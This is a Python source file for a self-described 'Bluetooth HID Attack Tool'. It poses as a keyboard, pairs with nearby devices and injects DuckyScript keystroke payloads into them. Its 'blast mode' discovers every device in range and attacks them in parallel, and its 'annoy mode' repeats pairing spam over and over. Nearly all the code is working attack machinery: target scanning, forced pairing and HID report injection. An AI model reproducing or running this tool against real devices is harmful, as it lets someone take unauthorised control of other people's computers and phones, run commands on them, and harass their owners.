import binascii, bluetooth, sys, time, datetime, logging, argparse
from multiprocessing import Process
from pydbus import SystemBus
from enum import Enum
import os

from utils.menu_functions import (main_menu, read_duckyscript, run, restart_bluetooth_daemon, get_target_address, perform_deep_scan, save_paired_device)
from utils.register_device import register_hid_profile, agent_loop

child_processes = []

# ANSI escape sequences for colors
class AnsiColorCode:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# Custom log level
NOTICE_LEVEL = 25

# Custom formatter class with added color for NOTICE
class ColorLogFormatter(logging.Formatter):
    COLOR_MAP = {
        logging.DEBUG: AnsiColorCode.BLUE,
        logging.INFO: AnsiColorCode.GREEN,
        logging.WARNING: AnsiColorCode.YELLOW,
        logging.ERROR: AnsiColorCode.RED,
        logging.CRITICAL: AnsiColorCode.MAGENTA,
        NOTICE_LEVEL: AnsiColorCode.CYAN,  # Color for NOTICE level
    }

    def format(self, record):
        color = self.COLOR_MAP.get(record.levelno, AnsiColorCode.WHITE)
        message = super().format(record)
        return f'{color}{message}{AnsiColorCode.RESET}'


# Method to add to the Logger class
def notice(self, message, *args, **kwargs):
    if self.isEnabledFor(NOTICE_LEVEL):
        self._log(NOTICE_LEVEL, message, args, **kwargs)

# Adding custom level and method to logging
logging.addLevelName(NOTICE_LEVEL, "NOTICE")
logging.Logger.notice = notice

# Set up logging with color formatter and custom level
def setup_logging():
    log_format = "%(asctime)s - %(levelname)s - %(message)s"
    formatter = ColorLogFormatter(log_format)
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)

    # Set the logging level to INFO to filter out DEBUG messages
    logging.basicConfig(level=logging.INFO, handlers=[handler])


class ConnectionFailureException(Exception):
    pass

class Adapter:
    def __init__(self, iface):
        self.iface = iface
        self.bus = SystemBus()
        self.adapter = self._get_adapter(iface)

    def _get_adapter(self, iface):
        retries = 5
        while retries > 0:
            try:
                adapter = self.bus.get("org.bluez", f"/org/bluez/{iface}")
                # Verify it actually has the interface
                if adapter:
                    return adapter
            except:
                log.info(f"Waiting for adapter '{iface}' to initialize... ({retries} retries left)")
                time.sleep(1)
                retries -= 1
        
        log.error(f"Unable to find adapter '{iface}' after retries, aborting.")
        raise ConnectionFailureException("Adapter not found")

    def _run_command(self, command):
        result = run(command)
        if result.returncode != 0:
            raise ConnectionFailureException(f"Failed to execute command: {' '.join(command)}. Error: {result.stderr}")

    def set_property(self, prop, value):
        # Convert value to string if it's not
        value_str = str(value) if not isinstance(value, str) else value
        command = ["sudo", "hciconfig", self.iface, prop, value_str]
        self._run_command(command)

        # Verify if the property is set correctly
        verify_command = ["hciconfig", self.iface, prop]
        verification_result = run(verify_command)
        if value_str not in verification_result.stdout:
            log.error(f"Unable to set adapter {prop}, aborting. Output: {verification_result.stdout}")
            raise ConnectionFailureException(f"Failed to set {prop}")

    def power(self, powered):
        self.adapter.Powered = powered

    def reset(self):
        self.power(False)
        self.power(True)

    def enable_ssp(self):
        try:
            # Command to enable SSP - the actual command might differ
            # This is a placeholder command and should be replaced with the actual one.
            ssp_command = ["sudo", "hciconfig", self.iface, "sspmode"]
            ssp_result = run(ssp_command)
            if ssp_result.returncode != 0:
                log.error(f"Failed to enable SSP: {ssp_result.stderr}")
                raise ConnectionFailureException("Failed to enable SSP")
        except Exception as e:
            log.error(f"Error enabling SSP: {e}")
            raise

class PairingAgent:
    def __init__(self, iface, target_addr):
        self.iface = iface
        self.target_addr = target_addr
        dev_name = "dev_%s" % target_addr.upper().replace(":", "_")
        self.target_path = "/org/bluez/%s/%s" % (iface, dev_name)

    def __enter__(self):
        try:
            log.debug("Starting agent process...")
            self.agent = Process(target=agent_loop, args=(self.target_path,))
            self.agent.start()
            time.sleep(0.25)
            log.debug("Agent process started.")
            return self
        except Exception as e:
            log.error(f"Error starting agent process: {e}")
            raise

    def __exit__(self, exc_type, exc_val, exc_tb):
        try:
            log.debug("Terminating agent process...")
            self.agent.kill()
            time.sleep(2)
            log.debug("Agent process terminated.")
        except Exception as e:
            log.error(f"Error terminating agent process: {e}")
            raise

class L2CAPConnectionManager:
    def __init__(self, target_address):
        self.target_address = target_address
        self.clients = {}

    def create_connection(self, port):
        client = L2CAPClient(self.target_address, port)
        self.clients[port] = client
        return client

    def connect_all(self):
        try:
            return sum(client.connect() for client in self.clients.values())
        except ConnectionFailureException as e:
            log.error(f"Connection failure: {e}")
            raise

    def close_all(self):
        for client in self.clients.values():
            client.close()

# Custom exception to handle reconnection
class ReconnectionRequiredException(Exception):
    def __init__(self, message, current_line=0, current_position=0):
        super().__init__(message)
        time.sleep(2)
        self.current_line = current_line
        self.current_position = current_position

class L2CAPClient:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.connected = False
        self.sock = None

    def encode_keyboard_input(*args):
      keycodes = []
      flags = 0
      for a in args:
        if isinstance(a, Key_Codes):
          keycodes.append(a.value)
        elif isinstance(a, Modifier_Codes):
          flags |= a.value
      assert(len(keycodes) <= 7)
      keycodes += [0] * (7 - len(keycodes))
      report = bytes([0xa1, 0x01, flags, 0x00] + keycodes)
      return report

    def close(self):
        if self.connected:
            self.sock.close()
        self.connected = False
        self.sock = None

    def reconnect(self):
        # Notify the main script or trigger a reconnection process
        raise ReconnectionRequiredException("Reconnection required")

    def send(self, data):
        if not self.connected:
            log.error("[TX] Not connected")
            self.reconnect()

        # Get the current timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

        # Add the timestamp to your log message
        log.debug(f"[{timestamp}][TX-{self.port}] Attempting to send data: {binascii.hexlify(data).decode()}")
        try:
            self.attempt_send(data)
            log.debug(f"[TX-{self.port}] Data sent successfully")
        except bluetooth.btcommon.BluetoothError as ex:
            log.error(f"[TX-{self.port}] Bluetooth error: {ex}")
            self.reconnect()
            self.send(data)  # Retry sending after reconnection
        except Exception as ex:
            log.error(f"[TX-{self.port}] Exception: {ex}")
            raise

    def attempt_send(self, data, timeout=0.5):
        start = time.time()
        while time.time() - start < timeout:
            try:
                self.sock.send(data)
                return
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11:  # no data available
                    raise
                time.sleep(0.001)

    def recv(self, timeout=0):
        start = time.time()
        while True:
            raw = None
            if not self.connected:
                return None
            if self.sock is None:
                return None
            try:
                raw = self.sock.recv(64)
                if len(raw) == 0:
                    self.connected = False
                    return None
                log.debug(f"[RX-{self.port}] Received data: {binascii.hexlify(raw).decode()}")
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11:  # no data available
                    raise ex
                else:
                    if (time.time() - start) < timeout:
                        continue
            return raw

    def connect(self, timeout=None):
        log.debug(f"Attempting to connect to {self.addr} on port {self.port}")
        log.info("connecting to %s on port %d" % (self.addr, self.port))
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(timeout)
        try:
            sock.connect((self.addr, self.port))
            sock.setblocking(0)
            self.sock = sock
            self.connected = True
            log.debug("SUCCESS! connected on port %d" % self.port)
        except Exception as ex:
            self.connected = False
            log.error("ERROR connecting on port %d: %s" % (self.port, ex))
            raise ConnectionFailureException(f"Connection failure on port {self.port}")

        return self.connected

    def send_keyboard_report(self, *args):
        self.send(self.encode_keyboard_input(*args))

    def send_keypress(self, *args, delay=0.0001):
        if args:
            log.debug(f"Attempting to send... {args}")
            self.send(self.encode_keyboard_input(*args))
            time.sleep(delay)
            # Send an empty report to release the key
            self.send(self.encode_keyboard_input())
            time.sleep(delay)
        else:
            # If no arguments, send an empty report to release keys
            self.send(self.encode_keyboard_input())
        time.sleep(delay)
        return True  # Indicate successful send

    def send_keyboard_combination(self, modifier, key, delay=0.004):
        # Press the combination
        press_report = self.encode_keyboard_input(modifier, key)
        self.send(press_report)
        time.sleep(delay)  # Delay to simulate key press
    
        # Release the combination
        release_report = self.encode_keyboard_input()
        self.send(release_report)
        time.sleep(delay)

def process_duckyscript(client, duckyscript, current_line=0, current_position=0):
    client.send_keypress('')  # Send empty report to ensure a clean start
    time.sleep(0.5)

    shift_required_characters = "!@#$%^&*()_+{}|:\"<>?ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    try:
        for line_number, line in enumerate(duckyscript):
            if line_number < current_line:
                continue  # Skip already processed lines

            if line_number == current_line and current_position > 0:
                line = line[current_position:]  # Resume from the last position within the current line
            else:
                current_position = 0  # Reset position for new line

            line = line.strip()
            log.info(f"Processing {line}")
            if not line or line.startswith("REM"):
                continue
            if line.startswith("TAB"):
                client.send_keypress(Key_Codes.TAB)
            if line.startswith("PRIVATE_BROWSER"):
                report = bytes([0xa1, 0x01, Modifier_Codes.CTRL.value | Modifier_Codes.SHIFT.value, 0x00, Key_Codes.n.value, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                client.send(report)
                # Don't forget to send a release report afterwards
                release_report = bytes([0xa1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                client.send(release_report)
            if line.startswith("VOLUME_UP"):
                # Send GUI + V
                hid_report_gui_v = bytes.fromhex("a1010800190000000000")
                client.send(hid_report_gui_v)
                time.sleep(0.1)  # Short delay

                client.send_keypress(Key_Codes.TAB)

                # Press UP while holding GUI + V
                hid_report_up = bytes.fromhex("a1010800195700000000")
                client.send(hid_report_up)
                time.sleep(0.1)  # Short delayF

                # Release all keys
                hid_report_release = bytes.fromhex("a1010000000000000000")
                client.send(hid_report_release)
            if line.startswith("DELAY"):
                try:
                    # Extract delay time from the line
                    delay_time = int(line.split()[1])  # Assumes delay time is in milliseconds
                    time.sleep(delay_time / 1000)  # Convert milliseconds to seconds for sleep
                except ValueError:
                    log.error(f"Invalid DELAY format in line: {line}")
                except IndexError:
                    log.error(f"DELAY command requires a time parameter in line: {line}")
                continue  # Move to the next line after the delay
            if line.startswith("STRING"):
                text = line[7:]
                for char_position, char in enumerate(text, start=1):
                    log.notice(f"Attempting to send letter: {char}")
                    # Process each character
                    try:
                        if char.isdigit():
                            key_code = getattr(Key_Codes, f"_{char}")
                            client.send_keypress(key_code)
                        elif char == " ":
                            client.send_keypress(Key_Codes.SPACE)
                        elif char == "[":
                            client.send_keypress(Key_Codes.LEFTBRACE)
                        elif char == "]":
                            client.send_keypress(Key_Codes.RIGHTBRACE)
                        elif char == ";":
                            client.send_keypress(Key_Codes.SEMICOLON)
                        elif char == "'":
                            client.send_keypress(Key_Codes.QUOTE)
                        elif char == "/":
                            client.send_keypress(Key_Codes.SLASH)
                        elif char == ".":
                            client.send_keypress(Key_Codes.DOT)
                        elif char == ",":
                            client.send_keypress(Key_Codes.COMMA)
                        elif char == "|":
                            client.send_keypress(Key_Codes.PIPE)
                        elif char == "-":
                            client.send_keypress(Key_Codes.MINUS)
                        elif char == "=":
                            client.send_keypress(Key_Codes.EQUAL)
                        elif char in shift_required_characters:
                            key_code_str = char_to_key_code(char)
                            if key_code_str:
                                key_code = getattr(Key_Codes, key_code_str)
                                client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
                            else:
                                log.warning(f"Unsupported character '{char}' in Duckyscript")
                        elif char.isalpha():
                            key_code = getattr(Key_Codes, char.lower())
                            if char.isupper():
                                client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
                            else:
                                client.send_keypress(key_code)
                        else:
                            key_code = char_to_key_code(char)
                            if key_code:
                                client.send_keypress(key_code)
                            else:
                                log.warning(f"Unsupported character '{char}' in Duckyscript")
                                
                        current_position = char_position

                    except AttributeError as e:
                        log.warning(f"Attribute error: {e} - Unsupported character '{char}' in Duckyscript")
            
            elif any(mod in line for mod in ["SHIFT", "ALT", "CTRL", "GUI", "COMMAND", "WINDOWS"]):
                # Process modifier key combinations
                components = line.split()
                if len(components) == 2:
                    modifier, key = components
                    try:
                        # Convert to appropriate enums
                        modifier_enum = getattr(Modifier_Codes, modifier.upper())
                        key_enum = getattr(Key_Codes, key.lower())
                        client.send_keyboard_combination(modifier_enum, key_enum)
                        log.notice(f"Sent combination: {line}")
                    except AttributeError:
                        log.warning(f"Unsupported combination: {line}")
                else:
                    log.warning(f"Invalid combination format: {line}")
            elif line.startswith("ENTER"):
                client.send_keypress(Key_Codes.ENTER)
            # After processing each line, reset current_position to 0 and increment current_line
            current_position = 0  
            current_line += 1  

    except ReconnectionRequiredException:
        raise ReconnectionRequiredException("Reconnection required", current_line, current_position)
    except Exception as e:
        log.error(f"Error during script execution: {e}")

def char_to_key_code(char):
    # Mapping for special characters that always require SHIFT
    shift_char_map = {
        '!': 'EXCLAMATION_MARK',
        '@': 'AT_SYMBOL',
        '#': 'HASHTAG',
        '$': 'DOLLAR',
        '%': 'PERCENT_SYMBOL',
        '^': 'CARET_SYMBOL',
        '&': 'AMPERSAND_SYMBOL',
        '*': 'ASTERISK_SYMBOL',
        '(': 'OPEN_PARENTHESIS',
        ')': 'CLOSE_PARENTHESIS',
        '_': 'UNDERSCORE_SYMBOL',
        '+': 'KEYPADPLUS',
	    '{': 'LEFTBRACE',
	    '}': 'RIGHTBRACE',
	    ':': 'SEMICOLON',
	    '\\': 'BACKSLASH',
	    '"': 'QUOTE',
        '<': 'COMMA',
        '>': 'DOT',
	    '?': 'QUESTIONMARK',
	    'A': 'a',
	    'B': 'b',
	    'C': 'c',
	    'D': 'd',
	    'E': 'e',
	    'F': 'f',
	    'G': 'g',
	    'H': 'h',
	    'I': 'i',
	    'J': 'j',
	    'K': 'k',
	    'L': 'l',
	    'M': 'm',
	    'N': 'n',
	    'O': 'o',
	    'P': 'p',
	    'Q': 'q',
	    'R': 'r',
	    'S': 's',
	    'T': 't',
	    'U': 'u',
	    'V': 'v',
	    'W': 'w',
	    'X': 'x',
	    'Y': 'y',
	    'Z': 'z',
	
    }
    return shift_char_map.get(char)

# Key codes for modifier keys
class Modifier_Codes(Enum):
    CTRL = 0x01
    RIGHTCTRL = 0x10

    SHIFT = 0x02
    RIGHTSHIFT = 0x20

    ALT = 0x04
    RIGHTALT = 0x40

    GUI = 0x08
    WINDOWS = 0x08
    COMMAND = 0x08
    RIGHTGUI = 0x80

class Key_Codes(Enum):
    NONE = 0x00
    a = 0x04
    b = 0x05
    c = 0x06
    d = 0x07
    e = 0x08
    f = 0x09
    g = 0x0a
    h = 0x0b
    i = 0x0c
    j = 0x0d
    k = 0x0e
    l = 0x0f
    m = 0x10
    n = 0x11
    o = 0x12
    p = 0x13
    q = 0x14
    r = 0x15
    s = 0x16
    t = 0x17
    u = 0x18
    v = 0x19
    w = 0x1a
    x = 0x1b
    y = 0x1c
    z = 0x1d
    _1 = 0x1e
    _2 = 0x1f
    _3 = 0x20
    _4 = 0x21
    _5 = 0x22
    _6 = 0x23
    _7 = 0x24
    _8 = 0x25
    _9 = 0x26
    _0 = 0x27
    ENTER = 0x28
    ESCAPE = 0x29
    BACKSPACE = 0x2a
    TAB = 0x2b
    SPACE = 0x2c
    MINUS = 0x2d
    EQUAL = 0x2e
    LEFTBRACE = 0x2f
    RIGHTBRACE = 0x30
    CAPSLOCK = 0x39
    VOLUME_UP = 0x3b
    VOLUME_DOWN = 0xee
    SEMICOLON = 0x33
    COMMA = 0x36
    PERIOD = 0x37
    SLASH = 0x38
    PIPE = 0x31
    BACKSLASH = 0x31
    GRAVE = 0x35
    APOSTROPHE = 0x34
    LEFT_BRACKET = 0x2f
    RIGHT_BRACKET = 0x30
    DOT = 0x37
    RIGHT = 0x4f
    LEFT = 0x50
    DOWN = 0x51
    UP = 0x52

    # SHIFT KEY MAPPING
    EXCLAMATION_MARK = 0x1e
    AT_SYMBOL = 0x1f
    HASHTAG = 0x20
    DOLLAR = 0x21
    PERCENT_SYMBOL = 0x22
    CARET_SYMBOL = 0x23
    AMPERSAND_SYMBOL = 0x24
    ASTERISK_SYMBOL = 0x25
    OPEN_PARENTHESIS = 0x26
    CLOSE_PARENTHESIS = 0x27
    UNDERSCORE_SYMBOL = 0x2d
    QUOTE = 0x34
    QUESTIONMARK = 0x38
    KEYPADPLUS = 0x57

def terminate_child_processes():
    for proc in child_processes:
        if proc.is_alive():
            proc.terminate()
            proc.join()

def setup_bluetooth(target_address, adapter_id):
    restart_bluetooth_daemon()
    profile_proc = Process(target=register_hid_profile, args=(adapter_id, target_address))
    profile_proc.start()
    child_processes.append(profile_proc)
    adapter = Adapter(adapter_id)
    # Removing fatal set_property calls as they fail on some CSR dongles in VMs
    log.info("Skipping hardware renaming to ensure compatibility...")
    return adapter

def initialize_pairing(agent_iface, target_address):
    try:
        with PairingAgent(agent_iface, target_address) as agent:
            log.debug("Pairing agent initialized")
    except Exception as e:
        log.error(f"Failed to initialize pairing agent: {e}")
        raise ConnectionFailureException("Pairing agent initialization failed")

def establish_connections(connection_manager):
    if not connection_manager.connect_all():
        raise ConnectionFailureException("Failed to connect to all required ports")

def setup_and_connect(connection_manager, target_address, adapter_id):
    connection_manager.create_connection(1)   # SDP
    connection_manager.create_connection(17)  # HID Control
    connection_manager.create_connection(19)  # HID Interrupt
    initialize_pairing(adapter_id, target_address)
    establish_connections(connection_manager)
    return connection_manager.clients[19]

def get_adapter_path(bus, adapter_id):
    """Dynamically resolve the adapter path to avoid KeyErrors."""
    try:
        # Try primary path
        path = f"/org/bluez/{adapter_id}"
        obj = bus.get("org.bluez", path)
        if obj: return path
    except:
        pass
    
    # Fallback: Search managed objects
    try:
        mngr = bus.get("org.bluez", "/")
        objs = mngr.GetManagedObjects()
        for path, interfaces in objs.items():
            if "org.bluez.Adapter1" in interfaces:
                if adapter_id in path:
                    return path
        # Last resort: return first available adapter
        for path, interfaces in objs.items():
            if "org.bluez.Adapter1" in interfaces:
                return path
    except:
        pass
    return f"/org/bluez/{adapter_id}" # Default back

def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon_only=False, name="Unknown"):
    """Encapsulates the attack logic for a single target."""
    try:
        log.info(f"Targeting: {name} ({target_address})")
        bus = SystemBus()
        adapter_path = get_adapter_path(bus, adapter_id)
        adapter = bus.get("org.bluez", adapter_path)
        adapter.Pairable = True
        
        current_line = 0
        current_position = 0
        connection_manager = L2CAPConnectionManager(target_address)

        while True:
            try:
                # 1. Connect and initialize pairing
                log.info(f"[{target_address}] Initializing L2CAP connections (SDP/HID)...")
                hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
                
                # Successful pairing/connection reached here
                log.notice(f"[{target_address}] CONNECTION & PAIRING SUCCESS!")
                save_paired_device(target_address, name)

                if recon_only:
                    log.notice(f"[RECON] Successfully paired with {target_address}. Skipping payload.")
                    connection_manager.close_all()
                    return True

                # 2. Deliver Payload
                log.notice(f"[{target_address}] Injecting DuckyScript payload...")
                process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
                
                log.info(f"Payload sent successfully to {target_address}.")
                time.sleep(2)
                connection_manager.close_all()
                return True
                    
            except ReconnectionRequiredException as e:
                log.info(f"Reconnection required for {target_address}...")
                current_line = e.current_line
                current_position = e.current_position
                connection_manager.close_all()
                time.sleep(2)
            except Exception as e:
                if is_annoy_mode:
                    log.info(f"Connection rejected/failed for {target_address}: {e}. Retrying (Annoy Mode)...")
                    connection_manager.close_all()
                    time.sleep(2)
                else:
                    log.error(f"Attack failed for {target_address}: {e}")
                    connection_manager.close_all()
                    return False
    except Exception as e:
        log.error(f"Critical failure during attack on {target_address}: {e}")
        return False

from concurrent.futures import ThreadPoolExecutor

def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, is_annoy_mode=False, max_workers=5):
    """Refined Blast Mode: Automated targeting with parallel execution."""
    print(AnsiColorCode.CYAN + "\n" + "="*50)
    print(f"B L A S T  M O D E  A C T I V E  (Parallel)")
    print(f"Sub-mode: {'RECON' if recon_only else 'ATTACK'} | Policy: {'ANNOY' if is_annoy_mode else 'ONCE'}")
    print(f"Concurrency: {max_workers} simultaneous targets")
    print("="*50 + AnsiColorCode.RESET)
    print("[!] Successes are logged to 'paired_devices.txt'")
    print("[!] Automated sequence running. Press Ctrl+C to stop.\n")

    blasted_devices = set()
    bus = SystemBus()
    adapter_obj = None
    last_heartbeat = time.time()
    
    try:
        queue = []
        if initial_devices:
            for addr, name in initial_devices:
                queue.append((addr, name))
        
        adapter_path = get_adapter_path(bus, adapter_id)
        adapter_obj = bus.get("org.bluez", adapter_path)
        adapter_obj.StartDiscovery()
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            while True:
                if not queue and time.time() - last_heartbeat > 10:
                    print(f"[{time.strftime('%H:%M:%S')}] Still scanning for new targets... (Total Blasted: {len(blasted_devices)})")
                    last_heartbeat = time.time()

                # Refresh discovery objects
                mngr = bus.get("org.bluez", "/")
                objs = mngr.GetManagedObjects()
                
                for path, interfaces in objs.items():
                    if "org.bluez.Device1" in interfaces:
                        props = interfaces["org.bluez.Device1"]
                        name = props.get("Name", props.get("Alias", None))
                        addr = path.split('/')[-1].replace('dev_', '').replace('_', ':')
                        
                        if name and addr not in blasted_devices and not name.startswith("00-00-00"):
                            if (addr, name) not in queue:
                                log.info(f"New candidate identified: {name} ({addr})")
                                queue.append((addr, name))

                # Process queue in parallel
                futures = []
                while queue:
                    addr, name = queue.pop(0)
                    if addr in blasted_devices: continue
                    
                    blasted_devices.add(addr)
                    log.notice(f"[BLAST-INIT] Queuing parallel attack: {name} ({addr})")
                    futures.append(executor.submit(perform_attack, addr, adapter_id, duckyscript, is_annoy_mode, recon_only, name))
                
                # We don't necessarily need to wait for all futures here, 
                # but we should let the scan loop continue.
                # However, for terminal visibility, let's keep it somewhat managed.
                time.sleep(3) 
                last_heartbeat = time.time()
            
    except KeyboardInterrupt:
        print("\n[!] Blast Mode stopping... waiting for active threads to finish.")
    finally:
        if adapter_obj:
            try: adapter_obj.StopDiscovery()
            except: pass

# Main function
def main():
    parser = argparse.ArgumentParser(description="Bluetooth HID Attack Tool")
    parser.add_argument('--adapter', type=str, default='hci0', help='Specify the Bluetooth adapter to use (default: hci0)')
    args = parser.parse_args()
    adapter_id = args.adapter
    setup_logging()
    global log
    log = logging.getLogger(__name__)
        
    main_menu()
    
    # UNIFIED FLOW: Settings -> Scan/Select Target -> Mode Selection -> Execute
    while True:
        main_menu()
        result = get_target_address()
        
        if not result:
            log.info("No target selected. Exiting.")
            return

        if result == "GO_STEALTH":
            from utils.menu_functions import stealth_menu
            stealth_menu(adapter_id)
            continue

        is_blast = False
        initial_devices = None
        target_address = None

        if isinstance(result, tuple) and result[0] == "BLAST_ALL":
            is_blast = True
            initial_devices = result[1]
        else:
            target_address = result
        
        break # Exit loop to proceed with attack selection

    # 1. Choose Recon vs Attack
    print("\nSelect Action Mode:")
    print("1: Recon (Pairing Only)")
    print("2: Attack (Pairing + Payload)")
    action_choice = input("Enter choice (1/2): ").strip()
    recon_only = (action_choice == "1")

    # 2. Choose Once vs Annoy
    print("\nSelect Attack Policy:")
    print("1: Normal (One-shot per device)")
    print("2: Annoy (Persistent pairing spam)")
    policy_choice = input("Enter choice (1/2): ").strip()
    is_annoy_mode = (policy_choice == "2")

    # 3. Select Payload (if Attack)
    duckyscript = []
    if not recon_only:
        duckyscript = select_payload()
        if not duckyscript:
            log.info("No payload selected. Exiting.")
            return

    # 4. EXECUTE
    if is_blast:
        blast_loop(adapter_id, duckyscript, initial_devices=initial_devices, recon_only=recon_only, is_annoy_mode=is_annoy_mode)
    else:
        perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode=is_annoy_mode, recon_only=recon_only)

def select_payload():
    """Helper to list and select payload."""
    script_directory = os.path.dirname(os.path.realpath(__file__))
    payload_folder = os.path.join(script_directory, 'payloads/')  # Specify the relative path to the payloads folder.
    payloads = os.listdir(payload_folder)

    print("\nAvailable payloads:")
    for idx, payload_file in enumerate(payloads, 1): # Check and enumerate the files inside the payload folder.
        print(f"{idx}: {payload_file}")

    payload_choice = input("\nEnter the number of the payload you want to load: ")
    selected_payload = None

    try:
        payload_index = int(payload_choice) - 1
        selected_payload = os.path.join(payload_folder, payloads[payload_index])
    except (ValueError, IndexError):
        print("Invalid payload choice. No payload selected.")
        return None

    if selected_payload is not None:
        print(f"Selected payload: {selected_payload}")
        return read_duckyscript(selected_payload)
    return None

if __name__ == "__main__":
    setup_logging()
    log = logging.getLogger(__name__)
    try:
        main()
    finally:
        terminate_child_processes()
